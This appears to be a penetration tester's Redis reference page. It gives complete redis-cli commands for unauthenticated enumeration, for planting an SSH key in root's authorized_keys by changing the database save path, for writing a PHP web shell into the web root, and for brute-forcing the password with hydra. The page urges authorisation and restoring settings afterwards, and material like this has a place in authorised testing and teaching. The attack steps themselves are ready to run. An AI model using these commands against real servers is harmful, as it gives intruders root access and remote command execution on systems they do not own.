# Redis (6379)

!!! tip "Start here"
    Connect without credentials and run `INFO`. If it responds, enumerate the server role, service account, protected mode, and persistence settings before considering any state-changing file-write technique.

---

## Enumeration

```bash
nmap -p 6379 --script redis-info $IP
redis-cli -h $IP
```

---

## Basic Interaction

```bash
redis-cli -h $IP
redis-cli -h $IP --askpass
redis-cli -h $IP --user "$USERNAME" --askpass

# Once connected:
INFO
CONFIG GET protected-mode
CONFIG GET dir
CONFIG GET dbfilename
SCAN 0
GET KEY_NAME
```

Repeat `SCAN` with the returned cursor until it returns `0`; avoid `KEYS *` on a production-sized keyspace.

---

## SSH Key Injection

If Redis can write files and SSH is running:

!!! warning "Watch out"
    This technique changes Redis persistence settings and writes an RDB file outside the normal data directory. Use it only when state-changing exploitation is approved, record the original settings, and restore them afterward. `FLUSHALL` is unnecessary and must not be used.

```bash
# Generate a key pair
ssh-keygen -t rsa -f /tmp/redis_key

# Write the public key into Redis
{ printf '\n\n'; cat /tmp/redis_key.pub; printf '\n\n'; } \
  | redis-cli -h $IP -x SET runbook:ssh_key

# Set the write path to root's .ssh directory
redis-cli -h $IP CONFIG GET dir
redis-cli -h $IP CONFIG GET dbfilename
redis-cli -h $IP CONFIG SET dir /root/.ssh
redis-cli -h $IP CONFIG SET dbfilename authorized_keys
redis-cli -h $IP BGSAVE

# Connect
ssh -i /tmp/redis_key root@$IP
```

This works only when the Redis service account can write the selected `.ssh` directory and the resulting file is accepted by SSH. Restore `dir` and `dbfilename`, delete `runbook:ssh_key`, and save the database back to its original path after validation.

---

## Web Shell via File Write

If another service or configuration disclosure establishes a writable web root:

```bash
redis-cli -h $IP CONFIG SET dir /var/www/html
redis-cli -h $IP CONFIG SET dbfilename shell.php
redis-cli -h $IP SET runbook:web_payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h $IP BGSAVE
```

The output is an RDB file containing the payload, not a clean PHP source file. Whether it executes depends on the PHP handler tolerating non-PHP bytes and the Redis account being able to write the web root. Delete `runbook:web_payload` and restore the original persistence settings after the test.

---

## Brute Force (if password protected)

```bash
hydra -P passwords.txt redis://$IP
```
